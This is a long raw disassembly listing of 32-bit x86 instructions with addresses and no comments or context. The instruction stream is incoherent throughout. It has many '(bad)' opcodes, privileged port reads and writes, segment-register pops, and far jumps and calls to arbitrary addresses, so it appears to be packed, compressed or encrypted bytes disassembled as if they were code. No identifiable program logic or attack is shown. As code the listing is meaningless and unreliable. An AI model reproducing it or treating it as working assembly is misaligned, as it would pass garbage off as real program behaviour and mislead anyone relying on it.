  41b2a1:	in     al,0xfb
  41b2a3:	out    dx,al
  41b2a4:	xchg   esi,eax
  41b2a5:	les    edx,FWORD PTR [ebx]
  41b2a7:	jae    0x41b262
  41b2a9:	add    ah,BYTE PTR [edx-0x6a25e757]
  41b2af:	and    al,0xbe
  41b2b1:	leave  
  41b2b2:	btc    ebp,esp
  41b2b5:	mov    esp,0x2cd360cb
  41b2ba:	repz in al,0x70
  41b2bd:	aas    
  41b2be:	popf   
  41b2bf:	xchg   edx,eax
  41b2c0:	cld    
  41b2c1:	std    
  41b2c2:	xor    edi,DWORD PTR [edi+0x4d708766]
  41b2c8:	retf   
  41b2c9:	pop    ds
  41b2ca:	pop    edi
  41b2cb:	cmc    
  41b2cc:	jg     0x41b318
  41b2ce:	inc    esp
  41b2cf:	sub    ebp,DWORD PTR [ecx-0x65650a37]
  41b2d5:	(bad)  
  41b2d6:	pop    esp
  41b2d7:	frstor [bp+di+0xffb]
  41b2dc:	mov    ds:0x1c2d2e1b,al
  41b2e1:	ret    
  41b2e2:	inc    ebx
  41b2e3:	sbb    BYTE PTR [eax],0x5d
  41b2e6:	in     eax,0x8
  41b2e8:	xchg   ebp,eax
  41b2e9:	adc    bl,BYTE PTR [ebp+edi*8+0x7c]
  41b2ed:	dec    esi
  41b2ee:	in     eax,dx
  41b2ef:	ins    BYTE PTR es:[edi],dx
  41b2f0:	ds pop edi
  41b2f2:	repz adc ecx,ebx
  41b2f5:	frstor [eax-0x7c1c08cd]
  41b2fb:	or     eax,0x68c58dcb
  41b300:	out    0x3c,eax
  41b302:	fld    TBYTE PTR [eax+0x30]
  41b305:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b306:	mov    al,0xe2
  41b308:	ins    DWORD PTR es:[edi],dx
  41b309:	jp     0x41b2d0
  41b30b:	lods   al,BYTE PTR ds:[esi]
  41b30c:	sbb    edx,esi
  41b30e:	call   FWORD PTR [edi+eax*4-0x6a]
  41b312:	sub    eax,0xa76c07fa
  41b317:	push   ds
  41b318:	pop    ss
  41b319:	mov    esp,0x897003d3
  41b31e:	xor    eax,0xbb27a4bf
  41b323:	loope  0x41b38e
  41b325:	pop    ds
  41b326:	mov    bl,0x2f
  41b328:	add    DWORD PTR [edi-0x1df4e9ad],ecx
  41b32e:	scas   al,BYTE PTR es:[edi]
  41b32f:	pop    ds
  41b330:	ds pop ebx
  41b332:	loop   0x41b2c9
  41b334:	pop    ss
  41b335:	xor    BYTE PTR [ecx+0x74],dh
  41b338:	jmp    0x1d0ba7d4
  41b33d:	sub    DWORD PTR es:[ebp-0x6a9c323],eax
  41b344:	adc    ah,ch
  41b346:	xlat   BYTE PTR ds:[ebx]
  41b347:	push   ss
  41b348:	dec    edi
  41b349:	cmp    esi,ecx
  41b34b:	and    al,0x37
  41b34d:	cld    
  41b34e:	xchg   ebp,eax
  41b34f:	xchg   ah,ch
  41b351:	sbb    al,0xb5
  41b353:	nop
  41b354:	mov    ch,0xa2
  41b356:	popa   
  41b357:	js     0x41b38f
  41b359:	psubusb mm7,QWORD PTR [ebp+edx*4+0x4fab51ad]
  41b361:	ins    DWORD PTR es:[edi],dx
  41b362:	or     bl,BYTE PTR [ecx+0x5c43e174]
  41b368:	ins    DWORD PTR es:[edi],dx
  41b369:	jp     0x41b303
  41b36b:	jecxz  0x41b38c
  41b36d:	(bad)  
  41b36e:	mov    al,cl
  41b370:	inc    esi
  41b371:	jg     0x41b36e
  41b373:	ss out dx,al
  41b375:	out    0xd2,eax
  41b377:	mov    WORD PTR [edi],gs
  41b379:	mov    ah,0x4c
  41b37b:	and    BYTE PTR [esi],al
  41b37d:	adc    eax,0xd55d23f2
  41b382:	or     esp,ebp
  41b384:	or     esi,ebp
  41b386:	(bad)  
  41b387:	icebp  
  41b388:	loop   0x41b33d
  41b38a:	xchg   ebp,eax
  41b38b:	scas   eax,DWORD PTR es:[edi]
  41b38c:	jmp    0x1d31:0xea0e93c2
  41b393:	dec    edx
  41b394:	pop    DWORD PTR [ebx+0x14]
  41b397:	dec    edx
  41b398:	jb     0x41b355
  41b39a:	add    esp,DWORD PTR [edx+0x257d78c2]
  41b3a0:	jle    0x41b331
  41b3a2:	adc    al,0xaa
  41b3a4:	je     0x41b421
  41b3a6:	adc    al,0xb5
  41b3a8:	sbb    BYTE PTR [edx+0x41],dh
  41b3ab:	outs   dx,BYTE PTR ss:[esi]
  41b3ad:	das    
  41b3ae:	enter  0xaa63,0x77
  41b3b2:	retf   0xb68c
  41b3b5:	cmp    BYTE PTR [edi],bl
  41b3b7:	xchg   edx,eax
  41b3b8:	and    al,0x66
  41b3ba:	in     eax,0x24
  41b3bc:	sar    BYTE PTR [edi+0xd1544a8],1
  41b3c2:	push   esi
  41b3c3:	out    0x66,eax
  41b3c5:	sbb    BYTE PTR [edx],dh
  41b3c7:	in     eax,0x4d
  41b3c9:	stos   BYTE PTR es:[edi],al
  41b3ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3cb:	push   edx
  41b3cc:	gs cwde 
  41b3ce:	(bad)  
  41b3cf:	xchg   edx,eax
  41b3d0:	xchg   ebx,eax
  41b3d1:	fs or  al,0xb5
  41b3d4:	pop    esp
  41b3d5:	jl     0x41b421
  41b3d7:	sbb    ah,BYTE PTR [edx]
  41b3d9:	xchg   BYTE PTR [ebp-0x6b],ah
  41b3dc:	push   0xffffffca
  41b3de:	iret   
  41b3df:	and    dl,BYTE PTR [edx+edi*8+0x6d]
  41b3e3:	add    cl,BYTE PTR ds:0x5d7b8c85
  41b3e9:	sub    BYTE PTR [ebx-0x17],0xfa
  41b3ed:	sub    ah,BYTE PTR [ebp+0x32]
  41b3f0:	cmp    eax,0x81717e9d
  41b3f5:	clc    
  41b3f6:	clc    
  41b3f7:	rol    DWORD PTR [ebx+0x79],cl
  41b3fa:	xor    eax,0x2d4f1440
  41b3ff:	sub    eax,0xf1ec802d
  41b404:	pop    eax
  41b405:	popa   
  41b406:	cmp    DWORD PTR [eax-0x24442423],ebx
  41b40c:	dec    ebp
  41b40d:	cli    
  41b40e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b40f:	inc    esp
  41b410:	and    ecx,esi
  41b412:	fbstp  TBYTE PTR [edx]
  41b414:	dec    ecx
  41b415:	loope  0x41b3fb
  41b417:	xor    eax,0xfffffff2
  41b41a:	lods   al,BYTE PTR ds:[esi]
  41b41b:	cld    
  41b41c:	outs   dx,DWORD PTR ds:[esi]
  41b41d:	jb     0x41b402
  41b41f:	mov    al,ds:0x86e1e355
  41b424:	ja     0x41b3a6
  41b426:	fsubr  QWORD PTR [edx-0x11]
  41b429:	test   al,0x5e
  41b42b:	dec    ecx
  41b42c:	pushf  
  41b42d:	push   es
  41b42e:	pop    ebp
  41b42f:	inc    edx
  41b430:	test   esi,edi
  41b432:	inc    ecx
  41b433:	out    dx,al
  41b434:	hlt    
  41b435:	adc    eax,DWORD PTR [ebx]
  41b437:	outs   dx,DWORD PTR ds:[esi]
  41b438:	dec    esp
  41b439:	cwde   
  41b43a:	fist   DWORD PTR [ecx-0x76]
  41b43d:	mov    cs,WORD PTR [ebx]
  41b43f:	aam    0x3
  41b441:	arpl   cx,dx
  41b443:	push   ebx
  41b444:	pop    ebx
  41b445:	daa    
  41b446:	in     eax,0x1f
  41b448:	test   al,0xb3
  41b44a:	pop    ebx
  41b44b:	or     bh,BYTE PTR [edi+0x7197e9e8]
  41b451:	call   0xe8fab5eb
  41b456:	shr    DWORD PTR [eax],cl
  41b458:	enter  0x76e5,0xf8
  41b45c:	int    0xb4
  41b45e:	add    al,0xf0
  41b460:	push   cs
  41b461:	sub    eax,0xd752ee19
  41b466:	adc    al,0xa6
  41b468:	push   edi
  41b469:	retf   0xf8b3
  41b46c:	mov    dl,0xfa
  41b46e:	shr    DWORD PTR [ecx+esi*1+0x47ccd614],1
  41b475:	mov    al,0xc0
  41b477:	test   al,0x1f
  41b479:	push   es
  41b47a:	push   cs
  41b47b:	sbb    eax,0x5ab68490
  41b480:	cdq    
  41b481:	adc    edx,0x6674b33a
  41b487:	or     dl,BYTE PTR [edi+0x3b0fa30a]
  41b48d:	pusha  
  41b48e:	or     edi,DWORD PTR [edi]
  41b490:	mov    DWORD PTR [edx-0x20cea9e0],0x5a053047
  41b49a:	in     eax,0xc6
  41b49c:	(bad)  
  41b4a0:	out    0x92,eax
  41b4a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4a4:	mov    esp,0x3bd368ab
  41b4a9:	cdq    
  41b4aa:	test   dl,0x3d
  41b4ad:	mov    es,WORD PTR [eax]
  41b4af:	(bad)  
  41b4b0:	jno    0x41b4a4
  41b4b2:	jnp    0x41b4e3
  41b4b4:	test   al,0x7a
  41b4b6:	push   es
  41b4b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4b8:	xor    ebp,DWORD PTR [edi+edx*2-0x708ada04]
  41b4bf:	push   ebp
  41b4c0:	out    0xe5,al
  41b4c2:	xlat   BYTE PTR ds:[ebx]
  41b4c3:	sub    BYTE PTR [edx-0x407f98f1],dl
  41b4c9:	inc    ecx
  41b4ca:	xchg   esi,eax
  41b4cb:	push   edx
  41b4cc:	xor    eax,0x913eb206
  41b4d1:	(bad)  
  41b4d2:	or     DWORD PTR [esi-0x41194aac],eax
  41b4d8:	mov    dl,0x7c
  41b4da:	push   0xa595b9ff
  41b4df:	js     0x41b46a
  41b4e1:	inc    edi
  41b4e2:	xchg   ebp,eax
  41b4e3:	jb     0x41b501
  41b4e5:	outs   dx,BYTE PTR ds:[esi]
  41b4e6:	push   edx
  41b4e7:	lea    edi,[ebx]
  41b4e9:	dec    esi
  41b4ea:	in     al,0xd9
  41b4ec:	or     al,0xab
  41b4ee:	push   edx
  41b4ef:	dec    ecx
  41b4f0:	or     eax,edx
  41b4f2:	jns    0x41b4aa
  41b4f4:	lods   eax,DWORD PTR ds:[esi]
  41b4f5:	outs   dx,BYTE PTR ds:[esi]
  41b4f6:	cmp    al,0x43
  41b4f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4fa:	nop
  41b4fb:	fst    DWORD PTR [edx]
  41b4fd:	cdq    
  41b4fe:	push   cs
  41b4ff:	icebp  
  41b500:	dec    ebp
  41b501:	sbb    eax,0x442827c
  41b506:	inc    ebx
  41b507:	popa   
  41b508:	mov    ch,0x99
  41b50a:	dec    edx
  41b50b:	dec    edi
  41b50c:	mov    esi,0x5d76d4cd
  41b511:	fsubr  st(7),st
  41b513:	push   edx
  41b514:	test   al,0x9b
  41b516:	scas   eax,DWORD PTR es:[edi]
  41b517:	or     dh,bl
  41b519:	mov    ch,0x64
  41b51b:	and    cl,BYTE PTR [ebp-0x49]
  41b51e:	les    ebp,FWORD PTR [edx+0x229e59d6]
  41b524:	jge    0x41b4e8
  41b526:	sti    
  41b527:	std    
  41b528:	or     BYTE PTR [ecx-0x1e0d6194],bh
  41b52e:	(bad)  
  41b52f:	mov    cl,BYTE PTR [esi-0x30816d05]
  41b535:	aad    0xa
  41b537:	lea    edx,[esi-0x2f86a14a]
  41b53d:	les    edi,FWORD PTR [ebx+0x73]
  41b540:	popa   
  41b541:	test   BYTE PTR [ebx+ecx*4],bl
  41b544:	or     ebx,DWORD PTR [edx+0x26fa6c63]
  41b54a:	repz mov eax,ds:0x561bdfc5
  41b550:	rcl    BYTE PTR [esi],1
  41b552:	add    eax,0xb5ad05da
  41b557:	jmp    0x41b51b
  41b559:	dec    ecx
  41b55a:	mov    dh,0x91
  41b55c:	in     al,dx
  41b55d:	pop    ebp
  41b55e:	dec    edx
  41b55f:	pop    ebp
  41b560:	retf   0xe22a
  41b563:	push   eax
  41b564:	cmc    
  41b565:	out    0xc2,al
  41b567:	scas   eax,DWORD PTR es:[edi]
  41b568:	call   0x6c92f2de
  41b56d:	stos   BYTE PTR es:[edi],al
  41b56e:	clc    
  41b56f:	cmp    DWORD PTR [ebp-0x592d7a25],edx
  41b575:	jge    0x41b571
  41b577:	push   edx
  41b578:	xchg   esp,eax
  41b579:	lods   al,BYTE PTR ds:[esi]
  41b57a:	in     eax,dx
  41b57b:	(bad)  
  41b57c:	leave  
  41b57d:	lods   al,BYTE PTR ds:[esi]
  41b57e:	xchg   esi,eax
  41b57f:	out    0xdf,al
  41b581:	test   BYTE PTR [eax-0x24],0x90
  41b585:	dec    edx
  41b586:	xor    edi,DWORD PTR [esi+0x6302695d]
  41b58c:	inc    esi
  41b58d:	shl    DWORD PTR [ebx],cl
  41b58f:	enter  0xe996,0xd0
  41b593:	stos   DWORD PTR es:[edi],eax
  41b594:	mov    DWORD PTR [ebp+0x3f144c94],esi
  41b59a:	dec    ecx
  41b59b:	adc    DWORD PTR [ecx+0x6a],ecx
  41b59e:	mov    ecx,0x5cba9395
  41b5a3:	cmp    al,0xdd
  41b5a5:	pusha  
  41b5a6:	daa    
  41b5a7:	xor    eax,DWORD PTR [eax-0x71036357]
  41b5ad:	(bad)  
  41b5ae:	not    edx
  41b5b0:	fcomp  DWORD PTR [esp+esi*4]
  41b5b3:	into   
  41b5b4:	jp     0x41b5c5
  41b5b6:	jmp    0x80d95553
  41b5bb:	arpl   si,bx
  41b5bd:	(bad)  
  41b5be:	mov    edi,0xcccae31b
  41b5c3:	and    BYTE PTR [esi+ecx*8],ch
  41b5c6:	sbb    BYTE PTR [ebx+0x57],ch
  41b5c9:	sub    al,0xa7
  41b5cb:	gs enter 0xddd8,0x6b
  41b5d0:	lea    eax,[edx-0x49]
  41b5d3:	pusha  
  41b5d4:	call   0xda8f7e1f
  41b5d9:	icebp  
  41b5da:	sub    DWORD PTR [esi-0x3412340b],ebp
  41b5e0:	push   ds
  41b5e1:	call   0x4b5a:0xdbcb3c1f
  41b5e8:	dec    esi
  41b5e9:	adc    BYTE PTR [ebp-0x7d],dh
  41b5ec:	iret   
  41b5ed:	jmp    0x8491:0xd416189
  41b5f4:	inc    esp
  41b5f5:	cli    
  41b5f6:	jo     0x41b658
  41b5f8:	jmp    0x7534a5
  41b5fd:	aad    0x1a
  41b5ff:	xchg   ebp,eax
  41b600:	or     bh,BYTE PTR [ecx]
  41b602:	mov    ecx,0xd367b0de
  41b607:	cmp    bl,BYTE PTR [edx-0x4aecf8c4]
  41b60d:	das    
  41b60e:	loope  0x41b616
  41b610:	mov    dl,0x5b
  41b612:	out    0x97,al
  41b614:	sub    dh,BYTE PTR [ecx]
  41b616:	(bad)  
  41b617:	inc    ebx
  41b618:	cdq    
  41b619:	pop    esi
  41b61a:	mov    WORD PTR [ecx-0x7913321],ds
  41b620:	sub    esi,DWORD PTR [edx]
  41b622:	retf   
  41b623:	and    BYTE PTR [edx-0x7c],bl
  41b626:	fistp  QWORD PTR [eax]
  41b628:	or     al,0x40
  41b62a:	mov    ebp,?
  41b62c:	ds das 
  41b62e:	mov    bl,0x83
  41b630:	stos   DWORD PTR es:[edi],eax
  41b631:	test   al,0x54
  41b633:	inc    esi
  41b634:	(bad)  
  41b635:	jns    0x41b5f4
  41b637:	push   cs
  41b638:	add    bl,BYTE PTR [ebp-0x48468f0]
  41b63e:	jb     0x41b693
  41b640:	mov    esi,0x5ea2535b
  41b645:	adc    edi,DWORD PTR [eax]
  41b647:	mov    dl,0xbf
  41b649:	push   esp
  41b64a:	cmp    dl,cl
  41b64c:	pop    ecx
  41b64d:	es pop ss
  41b64f:	(bad)  
  41b651:	mov    edi,0xc94b4e41
  41b656:	retf   0xbd4e
  41b659:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b65a:	fbld   TBYTE PTR [eax+0x3288c71f]
  41b660:	pop    eax
  41b661:	not    DWORD PTR [eax+0x1f88badb]
  41b667:	leave  
  41b668:	dec    edi
  41b669:	(bad)  
  41b66b:	push   ss
  41b66c:	pop    es
  41b66d:	hlt    
  41b66e:	mov    BYTE PTR [esi+0x6a],cl
  41b671:	jge    0x41b60c
  41b673:	aam    0x68
  41b675:	ins    DWORD PTR es:[edi],dx
  41b676:	sbb    al,dl
  41b678:	in     eax,0xc0
  41b67a:	jmp    0x2d3b:0xbbbe65c
  41b681:	aaa    
  41b682:	cmp    cl,BYTE PTR [ebx+edx*8+0x55fc5d0e]
  41b689:	or     DWORD PTR [edx+0x48],esp
  41b68c:	out    0x85,al
  41b68e:	pop    ebp
  41b68f:	and    ch,0x40
  41b692:	gs xchg edi,eax
  41b694:	fs jl  0x41b6af
  41b697:	mov    cl,BYTE PTR ds:0x7078e911
  41b69d:	shr    DWORD PTR [ebp+ecx*4-0x5d],cl
  41b6a1:	in     eax,dx
  41b6a2:	je     0x41b6ec
  41b6a4:	lock xchg edx,eax
  41b6a6:	inc    ebp
  41b6a7:	arpl   WORD PTR [ebx+ebx*8+0xf],si
  41b6ab:	push   es
  41b6ac:	mov    ah,BYTE PTR [edx+0x1948e987]
  41b6b2:	enter  0xfc2,0x38
  41b6b6:	clc    
  41b6b7:	(bad)  ds:0xaee3e4db
  41b6bd:	nop
  41b6be:	test   BYTE PTR [esi],al
  41b6c0:	mov    dl,0x5
  41b6c2:	out    0x13,eax
  41b6c4:	fisubr DWORD PTR [eax]
  41b6c6:	jns    0x41b65e
  41b6c8:	out    0x27,eax
  41b6ca:	pop    es
  41b6cb:	inc    edi
  41b6cc:	stos   DWORD PTR es:[edi],eax
  41b6cd:	mov    dl,0xd1
  41b6cf:	push   ds
  41b6d0:	scas   eax,DWORD PTR es:[edi]
  41b6d1:	lea    edi,[edx+0x7]
  41b6d4:	out    0xe8,eax
  41b6d6:	sbb    al,0x49
  41b6d8:	pushf  
  41b6d9:	adc    DWORD PTR [eax-0x548fadae],eax
  41b6df:	mov    ah,0xac
  41b6e1:	xor    dl,bh
  41b6e3:	jl     0x41b6c4
  41b6e5:	shl    esi,1
  41b6e7:	mov    eax,0x77311e11
  41b6ec:	sub    BYTE PTR [ebx],al
  41b6ee:	(bad)  
  41b6ef:	js     0x41b73d
  41b6f1:	repz sar DWORD PTR [ebp+0x10],cl
  41b6f5:	mov    ds:0x6d27a345,eax
  41b6fa:	xchg   ebx,eax
  41b6fb:	mov    ds:0x3ee8e288,al
  41b700:	pop    esi
  41b701:	push   esp
  41b702:	xor    DWORD PTR [eax],esp
  41b704:	out    dx,eax
  41b705:	loopne 0x41b764
  41b707:	sub    DWORD PTR [edx+ecx*2-0x1c],edi
  41b70b:	add    BYTE PTR [ebx+0x2ed3ad44],ch
  41b711:	mov    esi,0xd2e31c42
  41b716:	xor    BYTE PTR [ebx-0x5b],ch
  41b719:	cmp    ebx,ebx
  41b71b:	int    0xc7
  41b71d:	imul   esp,DWORD PTR ds:0xff5179ab,0x8b2e9984
  41b727:	bound  esp,QWORD PTR [edi+0x14]
  41b72a:	cmp    BYTE PTR ds:0xa696c585,dl
  41b730:	mov    esp,0xe77cd305
  41b735:	mov    BYTE PTR [ecx],ah
  41b737:	sbb    al,0xfa
  41b739:	pushf  
  41b73a:	or     DWORD PTR [edi+0x4f5fd567],edx
  41b740:	mov    bh,0x90
  41b742:	mov    edi,0xf5e3b65
  41b747:	sbb    dl,al
  41b749:	adc    al,0x5
  41b74b:	mov    eax,0xb1625702
  41b750:	or     ah,bh
  41b752:	aam    0x38
  41b754:	popf   
  41b755:	cdq    
  41b756:	aad    0x9f
  41b758:	scas   eax,DWORD PTR es:[edi]
  41b759:	push   esp
  41b75a:	in     eax,0x55
  41b75c:	or     ebp,DWORD PTR [ecx]
  41b75e:	mov    bh,0x28
  41b760:	aas    
  41b761:	js     0x41b6f6
  41b763:	dec    ecx
  41b764:	add    BYTE PTR [esi-0x5c391bf9],0xda
  41b76b:	out    0xc9,al
  41b76d:	cmp    DWORD PTR [esi-0x4c],esi
  41b770:	inc    esp
  41b771:	rcr    esp,0x47
  41b774:	call   DWORD PTR [ebp-0x4a]
  41b777:	aas    
  41b778:	sub    DWORD PTR [eax+0x7a293aba],0xa5339e0a
  41b782:	ins    DWORD PTR es:[edi],dx
  41b783:	js     0x41b72d
  41b785:	xchg   ecx,eax
  41b786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b787:	push   esp
  41b788:	mov    esp,0x47928e4d
  41b78d:	sar    edi,0x4c
  41b790:	ja     0x41b72f
  41b792:	hlt    
  41b793:	mov    ds:0x25397c2d,eax
  41b798:	push   cs
  41b799:	rcr    DWORD PTR [edx-0x693fc6a4],1
  41b79f:	add    BYTE PTR [esi+ecx*2-0x2e08c034],ch
  41b7a6:	test   al,0xfd
  41b7a8:	imul   ebx,DWORD PTR [edi+0x6216568],0x4fb8ccc7
  41b7b2:	mov    dh,BYTE PTR [ecx]
  41b7b4:	lock cs mov eax,0x62e1e562
  41b7bb:	loopne 0x41b781
  41b7bd:	mov    edi,0xe9f5e45c
  41b7c2:	mov    esp,0x35e904da
  41b7c7:	inc    esp
  41b7c8:	les    edx,FWORD PTR [edx]
  41b7ca:	mov    dl,0x14
  41b7cc:	xchg   esp,esi
  41b7ce:	stos   BYTE PTR es:[edi],al
  41b7cf:	cmp    dh,BYTE PTR [edx]
  41b7d1:	shr    dh,0x88
  41b7d4:	or     BYTE PTR [eax],al
  41b7d6:	outs   dx,BYTE PTR ds:[esi]
  41b7d7:	outs   dx,DWORD PTR ds:[esi]
  41b7d8:	loop   0x41b851
  41b7da:	test   BYTE PTR [edi+0x492b0b41],cl
  41b7e0:	jne    0x41b847
  41b7e2:	pop    eax
  41b7e3:	lds    eax,FWORD PTR [ebx+eax*1-0x742c63bb]
  41b7ea:	push   0x15
  41b7ec:	call   0xc041:0xa78f534c
  41b7f3:	jg     0x41b868
  41b7f5:	mov    cl,ch
  41b7f7:	jecxz  0x41b791
  41b7f9:	fisttp DWORD PTR [edx+0x33]
  41b7fc:	pushf  
  41b7fd:	arpl   WORD PTR [edx],ax
  41b7ff:	add    esi,DWORD PTR [eax-0x2d]
  41b802:	retf   0x8ea
  41b805:	cs hlt 
  41b807:	imul   edi,ecx,0xaed00714
  41b80d:	scas   eax,DWORD PTR es:[edi]
  41b80e:	ds aas 
  41b810:	test   eax,0x35e86af9
  41b815:	and    al,0x1e
  41b817:	jp     0x41b7b8
  41b819:	scas   eax,DWORD PTR es:[edi]
  41b81a:	pop    esi
  41b81b:	(bad)  
  41b81c:	clc    
  41b81d:	gs js  0x41b7da
  41b820:	sub    ecx,edi
  41b822:	sub    al,0xbf
  41b824:	jo     0x41b897
  41b826:	mov    edi,0xa3a0cf56
  41b82b:	pop    edi
  41b82c:	popf   
  41b82d:	pop    esp
  41b82e:	xchg   ecx,eax
  41b82f:	(bad)  
  41b830:	mov    DWORD PTR [ecx-0x5b],ecx
  41b833:	clc    
  41b834:	mov    dh,0x38
  41b836:	(bad)  
  41b838:	inc    ebx
  41b839:	cmp    al,0x73
  41b83b:	out    dx,al
  41b83c:	idiv   DWORD PTR [edx]
  41b83e:	mov    ebx,ds
  41b840:	push   0xcacdc87f
  41b845:	push   es
  41b846:	into   
  41b847:	add    DWORD PTR [esi+eiz*2],esp
  41b84a:	push   edi
  41b84b:	(bad)  
  41b84c:	out    dx,al
  41b84d:	inc    ebp
  41b84e:	sub    BYTE PTR [esi-0x1416886d],al
  41b854:	out    0xf4,eax
  41b856:	enter  0xff65,0xaf
  41b85a:	(bad)  
  41b85b:	popf   
  41b85c:	ds dec esp
  41b85e:	loop   0x41b81d
  41b860:	(bad)  
  41b861:	std    
  41b862:	neg    BYTE PTR [edi+edi*4+0x4b]
  41b866:	mov    WORD PTR [edx+edi*2],gs
  41b869:	jmp    0x41b842
  41b86b:	ss jl  0x41b8d0
  41b86e:	fistp  WORD PTR [ebx]
  41b870:	ins    DWORD PTR es:[edi],dx
  41b871:	and    al,bl
  41b873:	fwait
  41b874:	pop    ebx
  41b875:	mov    eax,ds:0x2d86c4c1
  41b87a:	lds    ebp,FWORD PTR [esi+0x6d]
  41b87d:	pop    ss
  41b87e:	imul   esi,DWORD PTR [ecx-0x6ef293e5],0xfffffffb
  41b885:	mov    cl,0xa
  41b887:	je     0x41b8ab
  41b889:	inc    esi
  41b88a:	push   ebx
  41b88b:	sub    al,0x3e
  41b88d:	pop    ds
  41b88e:	scas   eax,DWORD PTR es:[edi]
  41b88f:	data16 fsubr QWORD PTR [ecx+0x4cdd3221]
  41b896:	pop    ebp
  41b897:	(bad)  
  41b899:	mov    BYTE PTR [eax-0x6f],ah
  41b89c:	sub    ch,BYTE PTR [eax-0x566029e]
  41b8a2:	pop    esi
  41b8a3:	sahf   
  41b8a4:	icebp  
  41b8a5:	stc    
  41b8a6:	inc    esp
  41b8a7:	ja     0x41b8d2
  41b8a9:	lahf   
  41b8aa:	xor    eax,0xab57b5a
  41b8af:	xlat   BYTE PTR ds:[ebx]
  41b8b0:	dec    eax
  41b8b1:	stos   DWORD PTR es:[di],eax
  41b8b3:	push   0xffffffab
  41b8b5:	icebp  
  41b8b6:	inc    esi
  41b8b7:	push   edx
  41b8b8:	dec    ecx
  41b8b9:	xchg   ebx,eax
  41b8ba:	ret    
  41b8bb:	sti    
  41b8bc:	adc    al,0x5b
  41b8be:	pushf  
  41b8bf:	rcr    BYTE PTR [edi+edi*2-0x4a],1
  41b8c3:	loop   0x41b89c
  41b8c5:	pop    ds
  41b8c6:	(bad)  
  41b8c7:	in     eax,dx
  41b8c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8c9:	std    
  41b8ca:	out    0x71,al
  41b8cc:	jb     0x41b8d0
  41b8ce:	(bad)  
  41b8d0:	and    eax,0x89c1092
  41b8d5:	adc    DWORD PTR [edi-0x7a591736],0xffffffeb
  41b8dc:	sub    DWORD PTR [ecx-0x10],esi
  41b8df:	(bad)  
  41b8e3:	shr    DWORD PTR [eax],cl
  41b8e5:	mov    dl,0x7
  41b8e7:	mov    edx,0xc10cc6f7
  41b8ec:	push   esp
  41b8ed:	arpl   WORD PTR [eax],ax
  41b8ef:	cli    
  41b8f0:	sub    bl,BYTE PTR [edx-0x4]
  41b8f3:	sub    BYTE PTR [ecx+0x4f738e21],0x1f
  41b8fa:	pop    eax
  41b8fb:	dec    ecx
  41b8fc:	xor    eax,0xfcbe404f
  41b901:	rol    DWORD PTR [ebp+0x17],cl
  41b904:	jl     0x41b94a
  41b906:	mov    ecx,0x300c0eb8
  41b90b:	jns    0x41b8db
  41b90d:	stos   DWORD PTR es:[edi],eax
  41b90e:	mov    eax,ds:0x11de89ab
  41b913:	es mov edx,0x2f376455
  41b919:	sbb    al,0xfe
  41b91b:	div    DWORD PTR [edx]
  41b91d:	mov    bl,0x4e
  41b91f:	gs xchg ecx,eax
  41b921:	mov    cl,0x5e
  41b923:	push   edx
  41b924:	jmp    0x41b8f3
  41b926:	or     al,0x24
  41b928:	and    eax,0xc88792ac
  41b92d:	pop    edx
  41b92e:	or     eax,0x23b15883
  41b933:	jp     0x41b8f4
  41b935:	ja     0x41b8cc
  41b937:	ret    0x925b
  41b93a:	jmp    ecx
  41b93c:	dec    esi
  41b93d:	icebp  
  41b93e:	sub    dh,BYTE PTR [edi]
  41b940:	pop    ebp
  41b941:	pop    esi
  41b942:	xchg   bh,dl
  41b944:	push   ds
  41b945:	repz jp 0x41b9a8
  41b948:	mov    dh,BYTE PTR [edx+0x55]
  41b94b:	fwait
  41b94c:	dec    DWORD PTR [ecx-0x419862b0]
  41b952:	cmp    BYTE PTR [edx-0x6d104168],ch
  41b958:	(bad)  
  41b959:	mov    es,WORD PTR [edx+0x1715412c]
  41b95f:	gs cdq 
  41b961:	add    eax,0xe26f648f
  41b966:	dec    ebp
  41b967:	fcomp  DWORD PTR [ebx-0x24]
  41b96a:	or     edx,DWORD PTR [eax+0x7121ca6f]
  41b970:	mov    DWORD PTR [esi-0x68],ecx
  41b973:	mov    edi,0xf0fad8aa
  41b978:	sub    esi,DWORD PTR [esi+edi*2-0x2075fa6f]
  41b97f:	ins    BYTE PTR es:[edi],dx
  41b980:	and    eax,0x9ec53f69
  41b985:	jns    0x41b9b8
  41b987:	sbb    al,0xfb
  41b989:	dec    ebp
  41b98a:	inc    eax
  41b98b:	or     ebx,ecx
  41b98d:	add    dh,BYTE PTR [ecx+0x45511ef6]
  41b993:	mov    esp,0xccf43593
  41b998:	sbb    eax,0xd20cb4b6
  41b99d:	js     0x41b981
  41b99f:	sbb    bh,BYTE PTR [edi]
  41b9a1:	aas    
  41b9a2:	add    eax,0xcde92b49
  41b9a7:	mov    bl,0xc6
  41b9a9:	shr    WORD PTR gs:[eax+0x2b1f4eba],cl
  41b9b1:	ins    DWORD PTR es:[edi],dx
  41b9b2:	and    esp,ecx
  41b9b4:	je     0x41ba32
  41b9b6:	pop    es
  41b9b7:	mov    al,ds:0x8c3434f4
  41b9bc:	mov    ah,BYTE PTR [ecx+0x58811d18]
  41b9c2:	sub    eax,0x213cd320
  41b9c7:	sub    eax,0xbecc0f5
  41b9cc:	or     eax,0x6ba270be
  41b9d1:	cmp    DWORD PTR ds:0xd1c43678,0xc5b33cb7
  41b9db:	pop    esp
  41b9dc:	retf   
  41b9dd:	pop    edx
  41b9de:	aad    0xa8
  41b9e0:	xlat   BYTE PTR ds:[ebx]
  41b9e1:	imul   ebp,DWORD PTR [ebp-0x30c2c971],0x52
  41b9e8:	dec    edx
  41b9e9:	mov    ebx,0x51241ed4
  41b9ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9ef:	sbb    edx,esi
  41b9f1:	and    edi,DWORD PTR [ecx-0x11]
  41b9f4:	or     ch,dl
  41b9f6:	data16 fdiv st,st(2)
  41b9f9:	fild   QWORD PTR [ecx+0x711ea7e7]
  41b9ff:	xchg   ebx,eax
  41ba00:	sbb    edx,ecx
